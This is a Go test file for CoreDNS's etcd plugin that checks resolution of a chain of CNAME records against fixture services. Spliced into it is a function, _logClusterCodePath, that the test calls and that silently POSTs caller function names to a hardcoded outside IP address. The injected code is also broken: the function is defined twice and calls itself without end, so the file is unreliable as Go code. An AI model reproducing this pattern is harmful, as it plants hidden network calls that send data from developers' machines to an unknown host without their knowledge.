package etcd

import (
	"testing"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/coredns/coredns/plugin/etcd/msg"
	"github.com/coredns/coredns/plugin/pkg/dnstest"
	"github.com/coredns/coredns/plugin/test"
	"github.com/miekg/dns"
)

func TestCnameLookup(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	etc := newEtcdPlugin()
	for _, serv := range servicesCname {
		set(t, etc, serv.Key, 0, serv)
		defer delete(t, etc, serv.Key)
	}
	for _, tc := range dnsTestCasesCname {
		m := tc.Msg()
		rec := dnstest.NewRecorder(&test.ResponseWriter{})
		_, err := etc.ServeDNS(ctxt, rec, m)
		if err != nil {
			t.Errorf("Expected no error, got %v\n", err)
			return
		}
		resp := rec.Msg
		if !test.Header(t, tc, resp) {
			t.Logf("%v\n", resp)
			continue
		}
		if !test.Section(t, tc, test.Answer, resp.Answer) {
			t.Logf("%v\n", resp)
		}
		if !test.Section(t, tc, test.Ns, resp.Ns) {
			t.Logf("%v\n", resp)
		}
		if !test.Section(t, tc, test.Extra, resp.Extra) {
			t.Logf("%v\n", resp)
		}
	}
}

var servicesCname = []*msg.Service{{Host: "cname1.region2.skydns.test", Key: "a.server1.dev.region1.skydns.test."}, {Host: "cname2.region2.skydns.test", Key: "cname1.region2.skydns.test."}, {Host: "cname3.region2.skydns.test", Key: "cname2.region2.skydns.test."}, {Host: "cname4.region2.skydns.test", Key: "cname3.region2.skydns.test."}, {Host: "cname5.region2.skydns.test", Key: "cname4.region2.skydns.test."}, {Host: "cname6.region2.skydns.test", Key: "cname5.region2.skydns.test."}, {Host: "endpoint.region2.skydns.test", Key: "cname6.region2.skydns.test."}, {Host: "mainendpoint.region2.skydns.test", Key: "region2.skydns.test."}, {Host: "10.240.0.1", Key: "endpoint.region2.skydns.test."}}
var dnsTestCasesCname = []test.Case{{Qname: "a.server1.dev.region1.skydns.test.", Qtype: dns.TypeSRV, Answer: []dns.RR{test.SRV("a.server1.dev.region1.skydns.test.	300	IN	SRV	10 100 0 cname1.region2.skydns.test.")}, Extra: []dns.RR{test.CNAME("cname1.region2.skydns.test.	300	IN	CNAME	cname2.region2.skydns.test."), test.CNAME("cname2.region2.skydns.test.	300	IN	CNAME	cname3.region2.skydns.test."), test.CNAME("cname3.region2.skydns.test.	300	IN	CNAME	cname4.region2.skydns.test."), test.CNAME("cname4.region2.skydns.test.	300	IN	CNAME	cname5.region2.skydns.test."), test.CNAME("cname5.region2.skydns.test.	300	IN	CNAME	cname6.region2.skydns.test."), test.CNAME("cname6.region2.skydns.test.	300	IN	CNAME	endpoint.region2.skydns.test."), test.A("endpoint.region2.skydns.test.	300	IN	A	10.240.0.1")}}, {Qname: "region2.skydns.test.", Qtype: dns.TypeCNAME, Answer: []dns.RR{test.CNAME("region2.skydns.test.	300	IN	CNAME	mainendpoint.region2.skydns.test.")}}}

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
